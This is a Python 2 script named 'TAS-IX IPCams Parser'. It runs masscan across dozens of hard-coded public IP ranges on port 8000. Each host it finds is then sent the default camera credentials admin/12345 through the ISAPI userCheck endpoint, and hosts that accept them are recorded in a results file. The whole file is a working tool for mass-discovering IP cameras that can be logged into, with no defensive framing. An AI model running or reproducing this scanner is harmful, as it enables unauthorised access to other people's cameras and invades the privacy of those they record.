# ...
# Started on: 2015.05.25
# Authors: Filatov Vladimir Olegovich
#
# =================================================
# Copyright 2015 Filatov Vladimir Olegovich
#                
#
# This file is part of TAS-IX IPCams Parser.
#
# ==================================================
#
# You can contact me at: neocaine@amneziainc.ru
# -----
# Description:
# 1
# 2
# 3
#
# ...
# =================================================

# ChangeLogs
#
#
# TODO 
# TODO 
#
#
# INSTALL
# Requirements
# Root Priveleges
# https://github.com/martinblech/xmltodict - XML To Dictionary Parser
# https://github.com/robertdavidgraham/masscan - Masscan For Range Scanning


#CONSTANTS
LOGIN = 'admin'
PWD = '12345'
SCRIPTRESULT = 'result.txt'
#LOGSFOLDER = '/tmp/ipcam/'
LOGGINGLEVEL = 40  # 'CRITICAL' : 50, 'ERROR' : 40, 'WARNING' : 30, 'INFO' : 20, 'DEBUG' : 10
ARCHIVEPATH = '/tmp/ipcam/archive//'
ARCHIVEFOLDERNAME = 'archive'
#FILENAME = 'sitedata.xml'
MASSCANFOLDER = '/home/neocaine/'
MASSCANRESULT = 'scan.xml'
MASSCANEXCLUDE = 'exclude'
MASSCANCONF = 'cam.conf'
MASSCANCAMPORTCONF = 'port = 8000'
MASSCANOUTPUTFORMATCONF = 'output-format = xml'
MASSCANRESULTCONF = 'output-filename = ' + MASSCANFOLDER+MASSCANRESULT
MASSCANEXCLUDECONF = 'excludefile = ' + MASSCANFOLDER+MASSCANEXCLUDE
MASSCANRANGECONF = '''http-user-agent = neocaine@amneziainc.ru
range = 31.135.208.0/21
range = 37.110.208.0/21
range = 46.8.35.0/24
range = 46.227.120.0/21
range = 46.255.64.0/21
range = 62.209.128.0/19
range = 80.80.208.0/20
range = 81.95.224.0/20
range = 82.215.65.0/24
range = 82.215.66.0/23
range = 82.215.68.0/22
range = 82.215.72.0/21
range = 82.215.80.0/21
range = 82.215.88.0/22
range = 83.69.128.0/19
range = 83.221.162.0/23
range = 83.221.168.0/21
range = 83.221.176.0/20
range = 84.54.64.0/19
range = 84.54.112.0/23
range = 84.54.120.0/22
range = 87.237.232.0/21
range = 89.146.64.0/18
range = 89.236.192.0/18
range = 91.188.128.0/19
range = 91.196.76.0/22
range = 91.203.172.0/22
range = 91.204.236.0/22
range = 91.212.89.0/24
range = 91.212.180.0/24
range = 91.213.31.0/24
range = 91.229.160.0/22
range = 91.229.164.0/23
range = 91.231.56.0/22
range = 91.234.218.0/23
range = 91.240.12.0/22
range = 92.38.24.0/22
range = 94.141.64.0/19
range = 94.158.48.0/20
range = 94.230.224.0/20
range = 109.207.240.0/20
range = 178.216.128.0/21
range = 178.218.200.0/21
range = 185.4.160.0/22
range = 185.6.40.0/22
range = 185.8.212.0/24
range = 185.63.224.0/22
range = 185.74.4.0/22
range = 188.113.192.0/18
range = 193.27.206.0/23
range = 195.34.28.0/23
range = 195.88.214.0/23
range = 195.158.0.0/19
range = 195.211.180.0/22
range = 195.238.104.0/22
range = 213.206.32.0/19
range = 213.230.64.0/18
range = 217.12.80.0/22
range = 217.12.84.0/23
range = 217.12.86.0/24
range = 217.29.112.0/20
range = 217.30.160.0/20'''

import requests
import xmltodict
import shutil, zipfile
import os, logging, time
from datetime import datetime, timedelta
from urllib2 import urlopen
import urllib2, httplib
import socket
import requests


def make_conf_for_masscan():
    masscan_config = MASSCANRANGECONF + '\r\n'\
                    + MASSCANCAMPORTCONF + '\r\n'\
                    + MASSCANEXCLUDECONF + '\r\n'\
                    +  MASSCANOUTPUTFORMATCONF + '\r\n'\
                    + MASSCANRESULTCONF

    fname = MASSCANFOLDER + MASSCANCONF
    if os.path.exists(fname):
        os.remove(fname)
        open(fname, 'a').close()
        with open(fname, 'a') as masscan_conf:
            masscan_conf.seek(0)
            masscan_conf.write(masscan_config)
            masscan_conf.close()
    else:
        open(fname, 'a').close()
        with open(fname, 'a') as masscan_conf:
            masscan_conf.seek(0)
            masscan_conf.write(masscan_config)
            masscan_conf.close()

    fnameExclude = MASSCANFOLDER + MASSCANEXCLUDE
    open(fnameExclude, 'a').close()

def start_masscan():
    os.system('/usr/bin/masscan -c '+MASSCANFOLDER+MASSCANCONF)
#MakeDir Function


def mkdir(dir):
    logging.debug('_Function Called mkdir (dir = %s)' % dir)
    try:
        os.stat(dir)
    except:
        os.makedirs(dir)


def zipdir(path, zip):
    logging.debug('_Function Called zipdir(path = %s, zip = %s)' % (path, zip))
    for root, dirs, files in os.walk(path):
        for file in files:
            zip.write(os.path.join(root, file))


def delete_previous_file():
    logging.debug('_Function Called deletePreviousFile')
    try:
        os.remove(MASSCANFOLDER + MASSCANRESULT)
        os.remove(MASSCANFOLDER + SCRIPTRESULT)
    except:
        logging.warn("Cant Delete Folder Tree at %s" % MASSCANFOLDER)



def setup_custom_logger(name):
    formatter = logging.basicConfig(format=u'%(filename)s '
                                           u'[LINE:%(lineno)d]# '
                                           u'%(levelname)-8s '
                                           u'[%(asctime)s] '
                                           u'%(message)s', level=LOGGINGLEVEL)

    handler = logging.StreamHandler()
    handler.setFormatter(formatter)
    logger = logging.getLogger(name)
    logger.setLevel(logging.DEBUG)
    logger.addHandler(handler)
    return logger


def test_default_log_pass(ip):
    logging.debug('_Function Called testDefaultLogPass(ip) with ip=%s', ip)
    url = 'http://'+LOGIN+':'+PWD+'@' + ip +'/ISAPI/Security/userCheck?timeStamp=' + unixtime
    class MyException(Exception):
        pass

    try:
        a =urllib2.urlopen("http://"+ip, timeout = 3)
    except urllib2.URLError, e:
        logging.warning('Exception in urllib2.urlopen = %s', e)
        return 0
    except socket.timeout, e:
        logging.warning('Exception in socket = %s', e)
        return 0
    except socket.error, e:
        logging.warning('Exception in socket = %s', e)
        return 0
    except requests.ConnectionError, e:
        logging.warning('Exception in request = %s', e)
        return 0
    except requests.RequestException,e:
        logging.warning('Exception in request = %s', e)
        return 0
    except httplib.BadStatusLine, e:
        logging.warning('Exception in httplib = %s', e)
        return 0
    except:
        logging.warning("Unknown Exception while urllib2.urlopen")
        return 0


    logging.debug('Request Post To = %s', url)
    values = {'username': LOGIN,
              'password': PWD}
    r = requests
    try:
        r = requests.post(url, data=values)
    except requests.ConnectionError, e:
        logging.warning('Exception in requests = %s', e)
        return 0
    except httplib.BadStatusLine, e:
        logging.warning('Exception in httplib = %s', e)
        return 0
    except:
        logging.warning("Unknown Exception while requests.post")
        return 0

    fname = MASSCANFOLDER + MASSCANRESULT

    if os.path.exists(fname):
        os.remove(fname)
        open(fname, 'a').close()
        with open(fname, 'a') as myxmlfile:
            myxmlfile.seek(0)
            myxmlfile.write(r.content)
            myxmlfile.close()
    else:
        open(fname, 'a').close()
        with open(fname, 'a') as myxmlfile:
            myxmlfile.seek(0)
            myxmlfile.write(r.content)
            myxmlfile.close()

    with open(fname) as fd:
        try:
            obj = xmltodict.parse(fd.read())
        except:
            logging.warning("Can`t Parse Required xml data")
            return 0
    try:
        if int(obj['userCheck']['statusValue']) == 200:
            print ip + ' Has Default Log Password'
            os.system('/bin/echo ' + ip + ' Has Default Log Password'+ '>>' + MASSCANFOLDER+SCRIPTRESULT)
            os.system('/bin/echo ' + ip + '>>' + MASSCANFOLDER + MASSCANEXCLUDE)
    except:
        logging.debug("xml unknown format = %s",ip)

def masscan_return_parser():
    fname = MASSCANFOLDER + MASSCANRESULT
    if not os.path.exists(fname):
        print(fname)
        print("WTF")
        exit()
    with open(fname) as masscanResult:
        objects = xmltodict.parse(masscanResult.read())

    for w in objects['nmaprun']['host']:
        logging.debug("Getting Ip from XML = %s", w['address']['@addr'])
        test_default_log_pass(w['address']['@addr'])

logger = setup_custom_logger('root')
datenow = datetime.now()
unixtime = str(time.time() + timedelta(days=3).total_seconds())

delete_previous_file()
make_conf_for_masscan()
start_masscan()
masscan_return_parser()

#
